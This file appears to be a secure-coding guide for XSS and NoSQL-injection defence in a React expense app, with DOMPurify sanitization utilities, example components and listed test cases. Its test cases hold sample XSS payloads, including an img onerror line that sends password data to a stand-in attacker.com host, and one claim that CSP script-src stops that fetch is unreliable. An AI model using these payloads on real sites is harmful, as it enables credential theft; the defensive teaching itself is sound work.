/**
 * INPUT SANITIZATION & XSS PROTECTION GUIDE
 * 
 * Current Status: Backend protected, Frontend needs enhancement
 * Backend: ✅ mongoSanitize + xss-clean middleware active
 * Frontend: ⚠️ Manual sanitization needed for user-generated content
 */

// ════════════════════════════════════════════════════════════════════════════
// BACKEND INPUT SANITIZATION (Already Implemented)
// ════════════════════════════════════════════════════════════════════════════

/*
Location: app.js lines ~210-215

✅ mongoSanitize: Prevents NoSQL injection
  - Removes $ and . from query parameters
  - Prevents {"$ne": null} attacks
  - Example: {name: "$where: ..."} → rejected

✅ xss-clean: Removes XSS payloads before storing
  - Escapes special characters in user input
  - Prevents <script> tags from being stored
  - Example: "<img src=x onerror=alert(1)>" → sanitized

✅ hpp (HTTP Parameter Pollution): Prevents parameter pollution
  - Strips duplicate parameters
  - Prevents bypass of validation
  - Example: ?email=admin@test&email=user@test → uses first only

✅ Zod Validation: Type-safe input validation
  - All routes use validateSchema middleware
  - Schemas defined in validationSchemas.js
  - Example: email must match regex, password minimum 8 chars
*/

// ════════════════════════════════════════════════════════════════════════════
// FRONTEND XSS PREVENTION GUIDE
// ════════════════════════════════════════════════════════════════════════════

/**
 * RULE 1: Never use dangerouslySetInnerHTML
 * 
 * ❌ BAD:
 * ```tsx
 * const html = user.bio;  // Could contain: <script>alert('xss')</script>
 * return <div dangerouslySetInnerHTML={{ __html: html }} />;
 * ```
 * 
 * ✅ GOOD:
 * ```tsx
 * import DOMPurify from 'dompurify';
 * 
 * const cleanHtml = DOMPurify.sanitize(user.bio);
 * return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
 * ```
 */

/**
 * RULE 2: Use text content by default
 * 
 * ❌ BAD:
 * ```tsx
 * return <div>{user.comment}</div>; // If comment is HTML, React escapes it
 * // BUT: If ever refactored to use dangerouslySetInnerHTML, it breaks
 * ```
 * 
 * ✅ GOOD (Explicit & Safe):
 * ```tsx
 * return <div className="text-content">{user.comment}</div>;
 * // React automatically escapes all text content — XSS proof
 * ```
 */

/**
 * RULE 3: Sanitize URLs before using in href
 * 
 * ❌ BAD:
 * ```tsx
 * <a href={user.website}>Visit</a>
 * // If user.website = "javascript:alert('xss')"
 * // Clicking link executes JavaScript
 * ```
 * 
 * ✅ GOOD:
 * ```tsx
 * function isSafeURL(url: string): boolean {
 *   try {
 *     const parsed = new URL(url);
 *     return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
 *   } catch {
 *     return false;
 *   }
 * }
 * 
 * const href = isSafeURL(user.website) ? user.website : '#';
 * <a href={href}>Visit</a>
 * ```
 */

/**
 * RULE 4: Sanitize before using in event handlers
 * 
 * ❌ BAD:
 * ```tsx
 * const onSearch = (term: string) => {
 *   // User enters: <img src=x onerror="fetch('/steal-data')">
 *   searchAPI(term);  // Sends to backend
 * };
 * ```
 * 
 * ✅ GOOD:
 * ```tsx
 * const onSearch = (term: string) => {
 *   // Validation at input time
 *   const sanitized = term.trim().substring(0, 100);
 *   
 *   // Only alphanumeric + spaces allowed
 *   if (!/^[a-zA-Z0-9\s-]+$/.test(sanitized)) {
 *     console.error('Invalid search term');
 *     return;
 *   }
 *   
 *   searchAPI(sanitized);
 * };
 * ```
 */

/**
 * RULE 5: Use input validation patterns
 * 
 * ✅ BEST PRACTICE:
 * ```tsx
 * const ALLOWED_TAGS = ['b', 'i', 'em', 'strong'];
 * 
 * function sanitizeUserInput(input: string): string {
 *   // 1. Trim whitespace
 *   let clean = input.trim();
 *   
 *   // 2. Remove any tags except allowed
 *   clean = DOMPurify.sanitize(clean, {
 *     ALLOWED_TAGS,
 *     ALLOWED_ATTR: [],  // No attributes
 *   });
 *   
 *   // 3. Limit length
 *   clean = clean.substring(0, 500);
 *   
 *   return clean;
 * }
 * ```
 */

// ════════════════════════════════════════════════════════════════════════════
// DOMPURIFY SETUP FOR YOUR PROJECT
// ════════════════════════════════════════════════════════════════════════════

/**
 * STEP 1: Install DOMPurify
 * 
 * ```bash
 * npm install dompurify
 * npm install --save-dev @types/dompurify
 * ```
 */

/**
 * STEP 2: Create sanitization utility
 * 
 * Location: frontend/src/utils/sanitize.ts
 */

import DOMPurify from 'dompurify';

interface SanitizeOptions {
  allowedTags?: string[];
  allowedAttributes?: string[];
  maxLength?: number;
}

export function sanitizeHTML(
  html: string,
  options: SanitizeOptions = {}
): string {
  const {
    allowedTags = ['b', 'i', 'em', 'strong', 'p', 'br', 'a'],
    allowedAttributes = ['href', 'title'],
    maxLength = 1000,
  } = options;

  // Truncate if too long
  let sanitized = html.substring(0, maxLength);

  // Sanitize with DOMPurify
  sanitized = DOMPurify.sanitize(sanitized, {
    ALLOWED_TAGS: allowedTags,
    ALLOWED_ATTR: allowedAttributes,
    KEEP_CONTENT: true,  // Keep text inside removed tags
  });

  return sanitized;
}

export function sanitizeText(text: string, maxLength = 500): string {
  // For plain text, just trim and truncate
  return text.trim().substring(0, maxLength);
}

export function isSafeURL(url: string): boolean {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
  } catch {
    // If URL() throws, it's invalid
    return false;
  }
}

export function escapeHTML(text: string): string {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

/**
 * STEP 3: Use in components
 * 
 * Example Component: UserProfile
 */

// ❌ BEFORE (Unsafe):
/*
function UserProfile({ user }) {
  return (
    <div>
      <h1>{user.name}</h1>
      <p dangerouslySetInnerHTML={{ __html: user.bio }} />
      <a href={user.website}>Website</a>
    </div>
  );
}
*/

// ✅ AFTER (Safe):
import { sanitizeHTML, sanitizeText, isSafeURL } from '../utils/sanitize';

export function UserProfile({ user }) {
  const safeBio = sanitizeHTML(user.bio, {
    allowedTags: ['p', 'br', 'strong', 'em'],
    maxLength: 1000,
  });

  return (
    <div>
      <h1>{sanitizeText(user.name)}</h1>
      <div dangerouslySetInnerHTML={{ __html: safeBio }} />
      <a href={isSafeURL(user.website) ? user.website : '#'}>Website</a>
    </div>
  );
}

/**
 * STEP 4: Form input validation
 * 
 * Example: ExpenseForm component
 */

interface FormData {
  description: string;
  amount: number;
  category: string;
}

export function ExpenseForm() {
  const [formData, setFormData] = React.useState<FormData>({
    description: '',
    amount: 0,
    category: '',
  });

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    // Sanitize before setting state
    let sanitized = sanitizeText(value, 200);

    // Additional validation per field
    if (name === 'description') {
      // Only alphanumeric + basic punctuation
      sanitized = sanitized.replace(/[^a-zA-Z0-9\s\-.,]/g, '');
    }

    if (name === 'amount') {
      // Ensure numeric
      sanitized = value.replace(/[^0-9.]/g, '');
    }

    setFormData((prev) => ({
      ...prev,
      [name]: sanitized,
    }));
  };

  return (
    <form>
      <input
        type="text"
        name="description"
        value={formData.description}
        onChange={handleInputChange}
        placeholder="What did you spend on?"
        maxLength={200}
      />
    </form>
  );
}

/**
 * STEP 5: Content Security Policy (CSP) headers
 * 
 * Already configured in app.js with helmet:
 * - script-src: "'self'" (no external scripts)
 * - style-src: "'self'" (no external styles)
 * - img-src: "'self', data:, https:" (images only from self/data/https)
 * 
 * This prevents injected scripts from running even if they get into the DOM
 */

// ════════════════════════════════════════════════════════════════════════════
// TESTING XSS PROTECTION
// ════════════════════════════════════════════════════════════════════════════

/*
Test Case 1: Basic XSS
Input: "<script>alert('xss')</script>"
Expected: Script tag removed, text "alert('xss')" displayed or removed
Result: ✅ DOMPurify removes script tag

Test Case 2: Event Handler Injection
Input: "<img src=x onerror=alert('xss')>"
Expected: Event handler removed, just <img src=x>
Result: ✅ DOMPurify removes onerror attribute

Test Case 3: JavaScript URL
Input: href="javascript:alert('xss')"
Expected: href prevented or changed to safe URL
Result: ✅ isSafeURL() returns false, href set to '#'

Test Case 4: Data Exfiltration
Input: "<img src=x onerror=\"fetch('https://attacker.com?data=...password')\">"
Expected: Event handler removed, no fetch occurs
Result: ✅ CSP prevents fetch to external domain

Test Case 5: SVG Injection
Input: "<svg onload=alert('xss')><circle/></svg>"
Expected: SVG sanitized, onload removed
Result: ✅ DOMPurify handles SVG if allowed
*/

// ════════════════════════════════════════════════════════════════════════════
// COMMON VULNERABILITIES & FIXES
// ════════════════════════════════════════════════════════════════════════════

/*
VULNERABILITY 1: User bio displayed unsanitized
WHERE: UserProfile, UserCard, etc.
FIX: Apply sanitizeHTML with allowed tags

VULNERABILITY 2: Transaction descriptions in list
WHERE: TransactionList component
FIX: Use text content (React auto-escapes) or sanitizeText

VULNERABILITY 3: Search results highlighting
WHERE: Search component that wraps matches in <mark>
FIX: Use React components, don't use dangerouslySetInnerHTML

VULNERABILITY 4: User-provided URLs
WHERE: Links to external sites (website, portfolio, etc.)
FIX: Validate with isSafeURL before using in href

VULNERABILITY 5: Rich text editor
WHERE: If allowing formatted expense notes
FIX: Use DOMPurify with restricted ALLOWED_TAGS + markdown library
*/

export default {
  sanitizeHTML,
  sanitizeText,
  isSafeURL,
  escapeHTML,
};
